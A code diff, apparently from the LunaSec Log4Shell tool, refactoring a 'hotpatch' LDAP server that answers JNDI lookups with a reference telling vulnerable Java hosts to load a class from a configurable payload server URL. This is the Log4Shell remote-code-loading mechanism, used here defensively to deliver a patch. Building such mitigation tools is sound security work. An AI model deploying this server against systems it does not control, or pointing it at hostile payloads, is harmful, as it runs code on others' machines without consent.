@@ -17,14 +17,13 @@ package patch
 import (
 	"fmt"
 	ldapmsg "github.com/lor00x/goldap/message"
-	"github.com/lunasec-io/lunasec/tools/log4shell/constants"
 	"github.com/rs/zerolog/log"
 	"io/ioutil"
 	golog "log"
 )
 
 import (
-	"github.com/vjeantet/ldapserver"
+	"github.com/breadchris/ldapserver"
 )
 
 type Log4ShellLDAPServer interface {
@@ -33,18 +32,16 @@ type Log4ShellLDAPServer interface {
 }
 
 type HotpatchLDAPServer struct {
-	ipAddress string
+	port int
+	payloadServerUrl string
 	server *ldapserver.Server
 }
 
-func NewHotpatchLDAPServer(ipAddress string) Log4ShellLDAPServer {
+func NewHotpatchLDAPServer(port int, payloadServerUrl string) Log4ShellLDAPServer {
 	return &HotpatchLDAPServer{
-		ipAddress: ipAddress,
+		port: port,
+		payloadServerUrl: payloadServerUrl,
 	}
-}
-
-func (s *HotpatchLDAPServer) hotpatchCodebaseUrl() string {
-	return fmt.Sprintf("http://%s:%d/", s.ipAddress, constants.HotpatchServerPort)
 }
 
 func (s *HotpatchLDAPServer) Start() {
@@ -58,10 +55,20 @@ func (s *HotpatchLDAPServer) Start() {
 	s.server.Handle(routes)
 
 	go func() {
-		addr := "0.0.0.0:1389"
+		addr := fmt.Sprintf("0.0.0.0:%d", s.port)
+
 		log.Info().
 			Str("addr", addr).
-			Msg("starting hotpatch server")
+			Msg("Started live patch server")
+
+		defer func() {
+			if err := recover(); err != nil {
+				log.Error().
+					Err(err.(error)).
+					Msg("ldap client panic recovered")
+			}
+		}()
+
 		err := s.server.ListenAndServe(addr)
 		if err != nil {
 			log.Error().
@@ -69,6 +76,7 @@ func (s *HotpatchLDAPServer) Start() {
 				Msg("unable to start ldap server")
 			panic(err)
 		}
+		log.Info().Msg("Live Patch Server Started")
 	}()
 }
 
@@ -77,14 +85,24 @@ func (s *HotpatchLDAPServer) Stop() {
 }
 
 func (s *HotpatchLDAPServer) createSearchResultEntry(req ldapmsg.SearchRequest) ldapmsg.SearchResultEntry {
-	resolvedJNDICodebase := ldapmsg.AttributeValue(s.hotpatchCodebaseUrl())
+	resolvedJNDICodebase := ldapmsg.AttributeValue(s.payloadServerUrl)
+
+	payloadClassName := ldapmsg.AttributeValue("Log4ShellHotpatch")
+
+	payloadDescription := fmt.Sprintf(
+		"attempting to patch Log4Shell vulnerability with payload hosted on: %s%s.class",
+		resolvedJNDICodebase,
+		payloadClassName,
+	)
+
+	classNameAttribute := ldapmsg.AttributeValue(payloadDescription)
 
 	e := ldapserver.NewSearchResultEntry("cn=log4shell-hotpatch, " + string(req.BaseObject()))
 	e.AddAttribute("cn", "log4shell-hotpatch")
-	e.AddAttribute("javaClassName", "attempting to patch Log4Shell vulnerability...")
+	e.AddAttribute("javaClassName", classNameAttribute)
 	e.AddAttribute("javaCodeBase", resolvedJNDICodebase)
 	e.AddAttribute("objectclass", "javaNamingReference")
-	e.AddAttribute("javaFactory", "Log4ShellHotpatch")
+	e.AddAttribute("javaFactory", payloadClassName)
 	return e
 }
 
